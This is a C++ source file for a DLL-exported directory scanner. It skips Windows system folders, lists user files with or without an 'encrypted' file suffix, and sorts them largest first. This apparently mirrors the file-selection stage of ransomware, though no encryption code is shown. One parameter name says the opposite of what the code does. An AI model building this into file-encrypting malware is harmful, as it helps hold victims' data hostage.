#include "DirectoryScanner.h"

/**
 * Lists files in a directory, optionally searching only for decrypted files.
 *
 * @param directory The directory to scan for files.
 * @param searchOnlyForDecryptedFiles If true, only decrypted files will be listed.
 * @param fileList A vector to store the paths of the found files.
 * @param callback A callback function to be called for each found file.
 */
void DirectoryScanner::listFiles(const fs::path &directory, const bool searchOnlyForDecryptedFiles, std::vector<fs::path> &fileList, FileFoundCallback callback) const {
  if (!fs::exists(directory) || !fs::is_directory(directory)) {
    std::wcerr << "Error: Invalid directory: " << directory << std::endl;
    return;
  }

  std::vector<fs::path> dirs;
  dirs.push_back(directory);

  while (!dirs.empty()) {
    fs::path current_dir = dirs.back();
    dirs.pop_back();

    if (isSystemCritical(current_dir)) {
      std::wcerr << L"Skipping system-critical directory: " << current_dir << std::endl;
      continue;
    }

    for (const auto &entry: fs::directory_iterator(current_dir)) {
      try {
        if (!isValidPath(entry.path()) ||
            (fs::status(entry).permissions() & fs::perms::owner_read) == fs::perms::none) {
          continue;
        }

        if (fs::is_directory(entry) && !isSystemCritical(entry.path())) {
          dirs.push_back(entry.path());
        } else if (fs::is_regular_file(entry)
                   && !isSystemCritical(entry.path())
                   && fs::file_size(entry.path()) > 0) {
          if ((!searchOnlyForDecryptedFiles && !hasEncFileExtension(entry.path())) ||
              (searchOnlyForDecryptedFiles && hasEncFileExtension(entry.path()))) {
            fileList.push_back(entry.path());
            if (callback) {
              callback(entry.path());
            }
          }
        }
      } catch (const std::exception &e) {
        std::wcerr << L"Error accessing entry: " << entry.path() << L" -> " << e.what() << std::endl;
      }
    }
  }

  std::sort(fileList.begin(), fileList.end(), [](const fs::path &a, const fs::path &b) {
    return fs::file_size(a) > fs::file_size(b);
  });
}

/**
 * Checks if a path is valid by ensuring all characters are printable.
 *
 * @param p The path to check.
 * @return True if the path is valid, false otherwise.
 */
bool DirectoryScanner::isValidPath(const fs::path &p) {
  for (const auto &ch: p.wstring()) {
    if (!std::iswprint(ch)) {
      std::wcerr << L"Invalid character in path: " << p << std::endl;
      return false;
    }
  }
  return true;
}

/**
 * Checks if a file path is system-critical.
 *
 * @param filePath The file path to check.
 * @return True if the file path is system-critical, false otherwise.
 */
bool DirectoryScanner::isSystemCritical(const fs::path &filePath) {
  const std::vector<std::wstring> critical_paths = {
      L"Windows",
      L"Program Files",
      L"Program Files (x86)",
      L"System Volume Information",
      L"$Recycle.Bin",
      L"$RECYCLE.BIN",
      L"PerfLogs",
      L"Boot"
  };

  for (const auto &critical_path : critical_paths) {
    if (filePath.wstring().find(critical_path) != std::wstring::npos) {
      return true;
    }
  }

  return false;
}

/**
 * Checks if a file has an encrypted file extension.
 *
 * @param filepath The file path to check.
 * @return True if the file has an encrypted file extension, false otherwise.
 */
bool DirectoryScanner::hasEncFileExtension(const fs::path &filepath) {
  fs::path personalDataExtensions = globalDefinitions::encFileSuffix;
  fs::path extension = filepath.extension();
  return extension == personalDataExtensions;
}

/**
 * Scans for files in a directory and lists them.
 *
 * @param originalFilePath The path to the directory to scan.
 * @param searchOnlyForDecryptedFiles If true, only decrypted files will be listed.
 * @param fileList A vector to store the paths of the found files.
 * @param callback A callback function to be called for each found file.
 */
extern "C" {
[[maybe_unused]] FILESCANNER_API void ScanForFilesInDirectory(const wchar_t *originalFilePath, const bool searchOnlyForDecryptedFiles, std::vector<fs::path> &fileList, DirectoryScanner::FileFoundCallback callback) {
  fs::path directory(originalFilePath);
  DirectoryScanner directoryScanner;
  directoryScanner.listFiles(directory, searchOnlyForDecryptedFiles, fileList, std::move(callback));
}
}